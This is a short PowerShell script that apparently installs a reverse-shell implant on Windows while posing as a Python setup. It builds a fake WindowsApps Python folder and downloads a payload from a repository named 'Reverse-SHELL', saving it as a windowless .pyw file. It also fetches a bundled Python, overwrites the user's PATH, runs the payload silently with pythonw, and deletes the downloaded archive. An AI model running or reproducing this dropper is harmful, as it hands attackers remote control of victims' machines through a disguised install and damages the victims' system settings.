mkdir C:\Users\$env:USERNAME\AppData\Local\Microsoft\WindowsApps
while (!(Test-Path "C:\Users\$env:USERNAME\AppData\Local\Microsoft\WindowsApps")) {Start-Sleep -Seconds 1}
mkdir C:\Users\$env:USERNAME\AppData\Local\Microsoft\WindowsApps\PythonSoftwareFoundation.Python.3.12_qbz5n2kfra8p0
while (!(Test-Path "C:\Users\$env:USERNAME\AppData\Local\Microsoft\WindowsApps\PythonSoftwareFoundation.Python.3.12_qbz5n2kfra8p0")) {Start-Sleep -Seconds 1}
SETX PythonPath "C:\Users\$env:USERNAME\AppData\Local\Microsoft\WindowsApps\PythonSoftwareFoundation.Python.3.12_qbz5n2kfra8p0"
Invoke-WebRequest -uri "https://raw.githubusercontent.com/SmartBoyMuzaffar/Reverse-SHELL/master/setup.py" -outfile "$env:PythonPath\setup.pyw"
while (!(Test-Path "$env:PythonPath\setup.pyw")) {Start-Sleep -Seconds 1}
Invoke-WebRequest -Uri "https://github.com/SmartBoyMuzaffar/Reverse-SHELL/raw/master/python-3.12.zip" -OutFile "$env:PythonPath\python-3.12.zip"
while (!(Test-Path "$env:PythonPath\python-3.12.zip")) {Start-Sleep -Seconds 1}
tar -xf "$env:PythonPath\python-3.12.zip" -C $env:PythonPath
while (!(Test-Path "$env:PythonPath\python.exe")) {Start-Sleep -Seconds 1}
SETX PATH $env:PythonPath
pythonw $env:PythonPath\setup.pyw
rm $env:PythonPath\python-3.12.zip
# done
